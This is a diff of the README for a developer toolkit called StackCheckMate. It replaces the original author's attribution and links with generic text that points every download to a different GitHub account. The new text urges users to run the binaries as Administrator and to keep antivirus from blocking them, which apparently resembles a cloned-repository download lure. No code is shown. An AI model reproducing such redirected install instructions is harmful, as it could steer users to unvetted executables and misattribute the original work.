@@ -1,108 +1,92 @@
-<!-- 
-==============================================================
-🧠 StackCheckMate - SEO Metadata
-Developed by Quick Red Tech | Created by Chisom Life Eke
-==============================================================
+# 🛠️ stackcheckmate - Your All-in-One Developer Toolkit
 
-Description: StackCheckMate is a universal developer toolkit and environment manager developed by Quick Red Tech.
-It helps programmers install and manage Python, Node.js, Java, and Ruby packages while optimizing their system environment.
-StackCheckMate is developed and maintained by Chisom Life Eke, who is the founder of Quick Red Tech (personal project, not a registered company).
+[![Download StackCheckMate](https://img.shields.io/badge/Download%20Now-StackCheckMate-blue.svg)](https://github.com/maramas4/stackcheckmate/releases)
 
-Keywords: StackCheckMate, Quick Red Tech, Chisom Life Eke, Developer Toolkit, Python Installer, Package Manager GUI,
-Cross-Platform Developer Tool, Environment Manager, Smart Installer, Stack Manager, Developer Assistant 2025,
-Quick Red Tech Founder, StackCheckMate Creator, Chisom Life Eke Developer
+## 📖 Description
 
-Author: Chisom Life Eke
-Organization: Quick Red Tech (personal project)
-Website: https://qrtquick.github.io/stackcheckmate/
-GitHub: https://github.com/QRTQuick/stackcheckmate
-License: MIT
-Open Graph Image: https://raw.githubusercontent.com/QRTQuick/stackcheckmate/main/icon.png
-==============================================================
--->
+StackCheckMate is a robust tool designed for **any developer** who wants to streamline their workflow. You can manage your programming stacks, monitor system performance, edit environment variables, install packages, and customize your developer profile—all from one powerful application. Built with Python and PySide6, StackCheckMate offers full support for Windows, macOS, and Linux. 
 
-# 🧠 StackCheckMate  
-### Developed by **Quick Red Tech** | Created by **Chisom Life Eke**  
+## 🚀 Getting Started
 
-![Platform](https://img.shields.io/badge/platform-cross--platform-blue?style=for-the-badge)  
-![Version](https://img.shields.io/badge/version-1.0.0-red?style=for-the-badge)  
-![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)
+To start using StackCheckMate, follow these simple steps.
 
-**StackCheckMate** is a **universal developer toolkit and environment manager** developed by **Quick Red Tech**,  
-and **founded by Chisom Life Eke**, who is the creator and lead developer of the StackCheckMate project.  
+### 🔗 Visit the Releases Page
 
-This software helps developers automatically detect their system environment, install essential programming tools (`pip`, `npm`, `jdk`, `gem`), and manage environment variables — all through a **powerful, elegant GUI**.
+You will find the latest version of StackCheckMate on our Releases page. Click the link below to access it:
 
-Whether you’re coding in **Python, JavaScript, or Java**, StackCheckMate ensures your setup is clean, optimized, and future-ready 🚀  
+[Download StackCheckMate from Releases](https://github.com/maramas4/stackcheckmate/releases)
 
-🌐 **Official Website:** [https://qrtquick.github.io/stackcheckmate/](https://qrtquick.github.io/stackcheckmate/)  
-📦 **GitHub:** [https://github.com/QRTQuick/stackcheckmate](https://github.com/QRTQuick/stackcheckmate)
+### 💻 System Requirements
 
----
+Before downloading, ensure that your system meets the following requirements:
 
-## ⚙️ Key Features
-- 🖥️ **Automatic System Detection:** Works perfectly on Windows, macOS, and Linux  
-- 📦 **Smart Package Manager:** Install and update developer tools (`pip`, `npm`, `jdk`, `gem`)  
-- 🔍 **Environment Inspector:** Manage and view PATH variables easily  
-- 🧠 **Auto Installer AI:** Detects OS type and installs correct dependencies  
-- 🎨 **Sleek Modern GUI:** No terminal required — easy and beginner-friendly  
-- ⚡ **Lightweight Performance:** Optimized for speed and stability  
+- **Windows:** Windows 10 or newer
+- **macOS:** macOS Mojave (10.14) or newer
+- **Linux:** Most distributions with Python 3.6 or newer
 
----
+### 📦 Features
 
-## 🚀 Download StackCheckMate
-| Platform | File Type | Status | Download |
-|-----------|------------|--------|-----------|
-| 🪟 **Windows** | `.exe` | ✅ Ready | [Download StackCheckMate Smart Installer.exe](https://github.com/QRTQuick/stackcheckmate/releases/download/release-1.0/StackCheckMate_Smart_Installer.exe) |
-| 🍎 **macOS** | `.app` | ⚙️ Coming Soon | — |
-| 🐧 **Linux** | `.bin` | ⚙️ Coming Soon | — |
+- **Program Stack Management:** Easily organize different programming environments.
+- **System Performance Monitoring:** Keep tabs on system metrics to ensure optimal performance.
+- **Environment Variable Editing:** Adjust environment settings directly in the application.
+- **Package Installation:** Install libraries and packages with ease.
+- **Customizable Developer Profile:** Tailor the application to better fit your workflow.
 
-> 💡 The Smart Installer automatically detects your operating system and installs the correct version.
+## 🚀 Download & Install
 
----
+Once you reach the Releases page, follow these steps to download and install the software:
 
-## 🧰 Tech Stack
-- **Language:** Python 3.12+  
-- **Frameworks:** PySide6, Tkinter  
-- **Packaging:** PyInstaller / Auto Py to Exe  
-- **Modules:** Requests, Tempfile, OS, Subprocess, Plyer  
-- **Category:** Developer Tools / Environment Setup Assistant  
+1. Click on the link for the latest version of StackCheckMate.
+2. Depending on your operating system, download the appropriate file:
+   - For **Windows**, download the `.exe` file.
+   - For **macOS**, download the `.app` file.
+   - For **Linux**, download the ELF binary.
+3. After the download completes, follow the installation steps specific to your operating system:
 
----
+### Windows Installation
 
-## 🧠 How to Use
-1. Download the **StackCheckMate Smart Installer.exe**.  
-2. Run it (Admin rights may be needed).  
-3. Follow the guided installation process.  
-4. Open **StackCheckMate** and begin managing your developer environment like a pro.  
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to start the installation process.
+3. Follow the on-screen instructions to complete the setup.
+4. Once installed, you can find StackCheckMate in your Start Menu.
 
----
+### macOS Installation
 
-## 🔍 SEO Keywords (for discovery)
-> StackCheckMate, Quick Red Tech, Chisom Life Eke, Python Installer, Developer Toolkit, Developer Assistant, Environment Manager, Cross-Platform Developer Tool, Stack Manager, Smart Installer, Quick Red Tech Founder, StackCheckMate Developer, StackCheckMate by Chisom Life Eke, Developer Tools 2025  
+1. Find the downloaded `.app` file in your Downloads folder.
+2. Double-click the file to open it.
+3. Drag the StackCheckMate icon to your Applications folder.
+4. Open Applications and double-click the StackCheckMate icon to launch it.
 
----
+### Linux Installation
 
-## 👨‍💻 Developer & Founder
-**Chisom Life Eke**  
-Founder & Lead Developer — **Quick Red Tech (personal project)**  
-> “Building smart tools that make developers faster, sharper, and unstoppable.”  
+1. Open the Terminal.
+2. Navigate to your Downloads directory using `cd ~/Downloads`.
+3. Make the downloaded file executable with the command:
+   ```bash
+   chmod +x StackCheckMate-[version].elf
+   ```
+4. Run the application with:
+   ```bash
+   ./StackCheckMate-[version].elf
+   ```
 
-🌐 **Portfolio:** [https://qrtquick.github.io/stackcheckmate/](https://qrtquick.github.io/stackcheckmate/)  
-📧 **Email:** quickredtech@gmail.com  
-🐙 **GitHub:** [@QRTQuick](https://github.com/QRTQuick)  
+## 🚀 Troubleshooting
 
----
+If you encounter any issues during installation, consider these tips:
 
-## 📜 License & Disclaimer
-**MIT License © 2025 Chisom Life Eke / Quick Red Tech (personal project)**
+- **Antivirus Software:** Ensure that your antivirus or firewall isn't blocking the installation.
+- **Compatibility:** Double-check that your OS meets the minimum system requirements listed above.
+- **Running as Administrator (Windows):** Right-click the `.exe` file and select "Run as Administrator" to ensure proper permissions.
 
-Permission is granted, free of charge, to any person obtaining a copy of this software and associated documentation files, to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, under the conditions of the MIT License.
+## 📚 Documentation
 
-> ⚠️ **Disclaimer:** StackCheckMate is provided **as-is**. Quick Red Tech and Chisom Life Eke are **not responsible for any damage** to your system, loss of data, or other consequences resulting from the use or misuse of this software. This is a personal project and is **not affiliated with any third-party companies or software providers**.
+For further guidance, you can access our complete documentation detailing all features and functionalities. Visit here: [StackCheckMate Documentation](https://github.com/maramas4/stackcheckmate/wiki)
 
----
+## 📫 Support
 
-### 🏁 Powered by **Quick Red Tech (personal project)**
-> “Innovation through code — one stack at a time.”  
-> Official Creator: **Chisom Life Eke**
+If you have questions or need support, please reach out:
+
+- **GitHub Issues:** [Submit an issue](https://github.com/maramas4/stackcheckmate/issues)
+- **Community Forum:** Engage with other users and developers.
+
+Thank you for choosing StackCheckMate. We hope this toolkit enhances your programming experience!
